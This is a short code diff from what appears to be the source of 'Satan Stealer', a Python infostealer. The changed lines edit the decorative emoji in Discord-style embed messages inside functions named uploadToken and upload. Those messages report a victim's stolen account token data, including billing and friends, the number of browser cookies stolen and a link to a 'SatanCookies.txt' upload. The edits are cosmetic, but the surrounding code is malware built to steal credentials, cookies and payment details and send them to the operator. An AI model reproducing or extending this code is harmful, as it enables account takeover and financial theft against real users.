@@ -325,12 +325,12 @@ def uploadToken(token, path):
                     "inline": True
                 },
                 {
-                    "name": "<a:8243blackbat:957353629826838578> Billing:",
+                    "name": "<a:abat:965079896655265842> Billing:",
                     "value": f"{billing}",
                     "inline": True
                 },
                 {
-                    "name": "<a:4955uziyee:957353674487775282> HQ Friends:",
+                    "name": "<a:ablackfirearm:965087844731326514> HQ Friends:",
                     "value": f"{friends}",
                     "inline": False
                 }
@@ -378,7 +378,7 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "Satan | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <a:1888_Wand_Black:957353744578781304> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [SatanCookies.txt]({link})",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:bl_skull:937798683368505364> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [SatanCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
                         "text": "Satan Stealer",
